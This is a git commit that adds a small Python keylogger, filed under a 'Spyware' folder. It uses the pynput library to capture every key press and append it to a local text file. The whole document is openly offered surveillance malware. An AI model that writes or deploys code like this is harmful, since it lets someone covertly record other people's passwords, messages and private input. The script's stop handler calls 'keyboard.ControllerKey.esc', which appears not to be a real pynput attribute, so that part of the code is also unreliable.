dfd95ef59b16476ea8be94ec52c937712c6c7991
Luc-1577 <142753165+Luc-1577@users.noreply.github.com>
2024-03-21 13:32:04 -0300

    Add files via upload

---
+++ Spyware/Keylogger/keylogger.py
@@ -0,0 +1,27 @@
+from pynput import keyboard
+
+def get_info(key):
+    with open('test.txt', 'r') as fil:
+        words = fil.read()
+    with open('test.txt', 'w') as fil:
+        fil.write(words + key)
+
+def logger(key):
+    if key == keyboard.Key.space:
+        x = ' '
+
+    elif key == keyboard.Key.enter:
+        x = '\n\n'
+        
+    else:
+        x = (str(key))
+        
+    get_info(x)
+
+def release(key):
+    if key == keyboard.ControllerKey.esc:
+        # Stop listener
+        return False
+    
+with keyboard.Listener(on_press=logger, on_release=release) as ls:
+    ls.join()
